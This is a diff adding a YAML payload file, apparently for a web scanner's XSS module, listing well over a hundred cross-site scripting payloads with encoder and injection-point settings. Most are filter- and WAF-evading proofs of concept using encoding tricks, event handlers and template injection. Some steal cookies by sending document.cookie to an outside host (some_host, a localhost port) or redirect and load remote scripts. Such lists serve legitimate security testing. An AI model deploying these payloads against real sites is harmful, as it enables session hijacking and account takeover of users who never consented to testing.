@@ -1,0 +1,142 @@
+---
+payload:
+  - javascript:%ef%bb%bfalert(XSS)
+  - '%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F'
+  - <svG/x=">"/oNloaD=confirm()//
+  - alert?.(document?.cookie)
+  - <x/ onpointerRawupdatE=+\u0061\u006cert&DiacriticalGrave;1&DiacriticalGrave;>Tocuch me!
+  - <input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+  - <lol/onauxclick=[0].some(alert)>rightclickhere
+  - marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>
+  - <svg onload='new Function`["_Y000!_"].find(al\u0065rt)`'>
+  - <svg onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()">
+  - <svg onload=&#97&#108&#101&#114&#116(1)>
+  - <svg onload='new Function`["_Y000!_"].find(al\u0065rt)`'>
+  - <svg%09%0a%0b%0c%0d%a0%00%20onload=alert (1)>
+  - Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+  - <svg onload=alert("")>
+  - <svg onload=alert%26%230000000040"")>
+  - <svg onx=() onload=(confirm)(1)>
+  - <object/data=javascript:alert()>
+  - <a/href="javascript%0A%0D:alert()">
+  - <marquee loop=1 onfinish=alert( )>x
+  - Javascript://%E2%80%A9alert(618)
+  - ~2; "%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E"
+  - "for(t?c.outerHTmL=o:i=o=\u2019\u2019;i++<1024;o+=`<code onclick=this.innerHTmL=\u2019${M(i)?\u2019*\u2019:n||\u2019\xB7\u2019}\u2019>#</code>${i%64?\u2019\u2019:\u2019<p>\u2019}`)for(n=j=0;j<9;n+=M(i-65+j%3+(j++/3|0)*64))M=i=>i>64&i<960&i%64>1&C(i*i)>.7"
+  - <sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">
+  - $ <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? ------
+  - <img src=1 onerror="a:b:c:d:alert(1)">
+  - <iframe src=javascript:src=http://some_host></iframe>
+  - <svg onx=() onload=(confirm)(1)>
+  - <iframe src=data:text/html,<iframe src="data:text/html;base64,PD8+PD8+TT9MSz9KSyNAJDpMQCNKXkBePHNjcmlwdD5hbGVydCgnQml0QmFyZyA6KScpOzwvc2NyaXB0Pgo=">
+  - <a href=javas%26#99;ript:prompt%26#x28document.domain)>xss
+  - <script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.cookie)
+  - <script> http://window.name=`<img src=x onerror=alert(top.document.domain)>` location=`https://some_host/?xss=<iframe src=javascript:src=http://some_host>x</iframe>` </script>
+  - '"><video><source onerror=eval(atob(http://some_host)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>'
+  - <svg><script xlink:href="{ASCII}data:,alert(1)"></script></svg>
+  - <svg/OnLoad="`${prompt``}`">
+  - <xssBypass/onpointermove=(confirm)(1)>MoveMouseHere
+  - '{{constructor.constructor(''alert(1)'')()}}'
+  - '{{constructor.constructor(alert`1`)()}}'
+  - onerror="x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`
+  - Hh'><script>alert(1)</script> = waf
+  - Hh'><marquee loop=1 width=0 onfinish=pr\u006fmpt`_Y000!_`>Y000</marquee> = waf bypassed
+  - onerror="x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`
+  - '"on{{click=prompt(document[''cookie''])/*}}*/>'
+  - Tarun~<"><details/open/ontoggle="jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;">XXXXX</a>
+  - '%22%3e%3c%5K/onwheel=alert(1)%3emouse%20wheel%20here%3c%21--'
+  - <video src=x onerror="prompt(xss">
+  - <video src=x onerror="prompt(xss)">
+  - <sVg OnPointerEnter="location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div">
+  - <iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
+  - <iframe src="java sc ript:al ert()"></iframe>
+  - '{{{}[{toString:[].join,length:1,0:''__proto__''}].assign=[].join;''a''.constructor.prototype.charAt=[].join;$eval(''x=alert(1)//'');}}'
+  - <svg/OnLoad="`${prompt``}`">
+  - '%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx'
+  - <details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
+  - tarun"><x/onafterscriptexecute=confirm%26lpar;)//
+  - '{{constructor.constructor(''eval(atob(\''amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUp\''))'')()}}'
+  - "\u224B \"><!'/*\"*\\'/*\\\"/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># \u224B\""
+  - '">''><details/open/ontoggle=confirm(''XSS'')>'
+  - <input type="hidden" value="mypayload" /> %22%20autofocus%20onfocus%3d(confirm)(1)%2f%2f
+  - '%22%20autofocus%20onfocus%00%3d(confirm)(1)%2f%2f'
+  - 6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+  - '&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;'
+  - 'eval(atob(''YWxlcnQoKQ==''))'
+  - 'document[''cookie'']'
+  - <svg onx=() onload=(confirm)(1)>
+  - <img src onerror=confirm(1)>
+  - '&gt;+src+onerror=confirm&lpar;1&rpar;&lt;'
+  - '&gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;'
+  - "\"></textarea><ScRiPt>prompt(1)</ScRiPt// \"><iframe/onload=alert(1)// \u201D/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt\u201D/>"
+  - <x onauxclick=a=alert,a(domain)>click
+  - "'x'%2520onclick='confirm%601%60'"
+  - image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
+  - '">''><details/open/ontoggle=confirm(''XSS'')>'
+  - document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>')
+  - window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1)
+  - <img src=something onauxclick="new Function `al\ert\`xss\``">
+  - "`payload\xB4; %3Cimg src='null' onerror=alert('spyerror')%3E"
+  - <details onauxclick=confirm`xss`></details>
+  - <style>@keyframes a{}b{animation:a;}</style> <b/onanimationstart=prompt`${document.domain}&#x60;>
+  - <audio autoplay onloadstart=this.src='hxxps://some_host/?c='+document["cook"+"ie"]'src=x>
+  - <bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
+  - /<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+  - /<svg%0Aonauxclick=0;[1].some(confirm)//
+  - <details/open/ontoggle="self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];">
+  - "{` <body \\< onscroll =1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))>\xB4}"
+  - <svg%0Aonauxclick=0;[1].some(confirm)//
+  - (xss"><!--><svg/onload=alert(document.domain)>)
+  - <base href=//knoxss.me>
+  - <form><button formaction=javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`));//
+  - '" onauxclick=confirm`xss` "'
+  - <svg onauxclick='a=alert;b=document;a(b.domain)'>
+  - '%22onauxclick=alert`xss`+a'
+  - </pre><!-%00-><svg/%0D%0A%0D%0A/Id="a"/TABindex="1"/onload="\u0061lert(1);">
+  - "<script src=\"https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1\u2026)\"></script>"
+  - '">''><details/open/ontoggle=confirm(''XSS'')>'
+  - '%27;%0d%0d});%0d{onerror=prompt}throw document.location</ScRipT//'
+  - <object/data="javascript&colon;alert/**/(document.domain)">//
+  - <iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';>
+  - <img/src=q onerror='new Function`al\ert\`1\``'>
+  - open("https://host/?xss=%3Ca/href=javascript:1%26%26%26%23x6e;ame%3Eclick me%3C/a%3E","<svg onload=alert(document.domain)>");
+  - <IMG SRC="javascript:alert('XSS');">
+  - <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+  - <img src=x:alert(alt) onerror=eval(src) alt='spyerror'>
+  - '"></tag><svg onload=alert(spyerror)>'
+  - <iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>
+  - <img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+  - "<style>@KeyFrames z{</style><div style=animation-name:z onanimationend=&#97&#108&#101&#114&#116&grave;1&grave;> %253Cscript%253Ealert('XSS')%253C%252Fscript%253E\"</script>"
+  - "<!<script>alert(1)</script> \u201C"
+  - <details open ontoggle='self["ale"%2b"rt"]&lpar;document&period;domain&rpar;'>
+  - <svg/onload=%26nbsp;alert`bohdan`+
+  - <img src onerror=%26emsp;prompt`${document.domain}`>
+  - '%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E'
+  - <iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>
+  - <svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+  - /* <audio src=1 onloadstart=alert&lpar;1&rpar;//> */
+  - <img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+  - <style>img{background-image:url('javascript:alert(1)')}</style>
+  - '"><iframe srcdoc=''%26lt;script>;prompt${document.domain}%26lt;/script>''>'
+  - xss'"><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>
+  - <--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>
+  - '"><input/onauxclick="[1].map(prompt)">'
+  - <details open ontoggle="{alert`1`}"></details>
+  - <j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x
+  - data:text/html,<form action=https://127.0.0.1/xss-cp.php method=post><input type=hidden name=a value="<img/src=//127.0.0.1/yt.jpg onpointerenter=alert`1`>"><input type=submit></form>
+  - <j id=x style="-webkit-user-modify:read-write" onfocus={window.onerror=eval}throw/0/+name>H</j>#x
+  - 1'"><img/src/onerror=.1|alert``>
+  - <!<script>alert(document.domain)</script>
+  - <marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+  - <!<script>confirm(1)</script>
+  - <bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
+  - eval('al'+'ert'+'(12)');//
+encoder:
+  - URL
+placeholder:
+  - URLParam
+  - HTMLForm
+  - HTMLMultipartForm
+  - JSONRequest
+type: "XSS"
+...
